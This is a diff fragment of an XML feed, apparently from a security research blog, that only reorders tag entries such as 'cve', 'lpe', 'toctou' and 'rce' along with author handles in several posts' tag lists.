       <tag>pwnable</tag>
       
@@ -8914,9 +8914,9 @@
       
       <tag>cve</tag>
       
-      <tag>Fabu1ous</tag>
-      
       <tag>information disclosure</tag>
+      
+      <tag>Fabu1ous</tag>
       
     </tags>
     
@@ -8941,11 +8941,11 @@
     
     <tags>
       
+      <tag>uaf</tag>
+      
       <tag>javascript</tag>
       
       <tag>chrome</tag>
-      
-      <tag>uaf</tag>
       
       <tag>L0ch</tag>
       
@@ -9009,9 +9009,9 @@
       
       <tag>cve</tag>
       
-      <tag>Fabu1ous</tag>
-      
       <tag>lpe</tag>
+      
+      <tag>Fabu1ous</tag>
       
       <tag>toctou</tag>
       
@@ -9141,13 +9141,13 @@
       
       <tag>Fabu1ous</tag>
       
-      <tag>toctou</tag>
-      
       <tag>razer</tag>
       
       <tag>chroma</tag>
       
       <tag>race condition</tag>
+      
+      <tag>toctou</tag>
       
     </tags>
     
@@ -9302,9 +9302,9 @@
       
       <tag>lpe</tag>
       
-      <tag>toctou</tag>
-      
       <tag>race condition</tag>
+      
+      <tag>toctou</tag>
       
       <tag>idioth</tag>
       
@@ -9537,9 +9537,9 @@
       
       <tag>cve</tag>
       
-      <tag>eop</tag>
-      
       <tag>lpe</tag>
+      
+      <tag>eop</tag>
       
       <tag>named pipe</tag>
       
@@ -9609,9 +9609,9 @@
       
       <tag>cve</tag>
       
-      <tag>Fabu1ous</tag>
-      
       <tag>linux</tag>
+      
+      <tag>Fabu1ous</tag>
       
       <tag>side-channel attack</tag>
       
@@ -9747,9 +9747,9 @@
       
       <tag>cve</tag>
       
-      <tag>eop</tag>
-      
       <tag>lpe</tag>
+      
+      <tag>eop</tag>
       
       <tag>ubuntu</tag>
       
@@ -9873,9 +9873,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
+      
+      <tag>windows</tag>
       
       <tag>rce</tag>
       
@@ -9945,11 +9945,11 @@
       
       <tag>cve</tag>
       
+      <tag>linux</tag>
+      
       <tag>kernel</tag>
       
       <tag>Fabu1ous</tag>
-      
-      <tag>linux</tag>
       
       <tag>ebpf</tag>
       
@@ -10013,9 +10013,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
+      
+      <tag>windows</tag>
       
       <tag>integer overflow</tag>
       
@@ -10087,11 +10087,11 @@
       
       <tag>cve</tag>
       
+      <tag>linux</tag>
+      
       <tag>eop</tag>
       
       <tag>Fabu1ous</tag>
-      
-      <tag>linux</tag>
       
       <tag>blueman</tag>
       
@@ -10153,9 +10153,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
+      
+      <tag>windows</tag>
       
       <tag>eop</tag>
       
@@ -10246,13 +10246,13 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
       
-      <tag>eop</tag>
-      
       <tag>kernel</tag>
+      
+      <tag>windows</tag>
+      
+      <tag>eop</tag>
       
       <tag>idioth</tag>
       
@@ -10351,9 +10351,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
+      
+      <tag>windows</tag>
       
       <tag>ntfs</tag>
       
@@ -10415,9 +10415,9 @@
     
     <tags>
       
-      <tag>windows</tag>
-      
       <tag>cve</tag>
+      
+      <tag>windows</tag>
       
       <tag>eop</tag>
       
@@ -10450,9 +10450,9 @@
     
     <tags>
       
-      <tag>xss</tag>
-      
       <tag>cve</tag>
+      
+      <tag>xss</tag>
       
       <tag>rce</tag>
       
@@ -10491,9 +10491,9 @@
       
       <tag>cve</tag>
       
-      <tag>outlook</tag>
-      
       <tag>rce</tag>
+      
+      <tag>outlook</tag>
       
       <tag>idioth</tag>
       
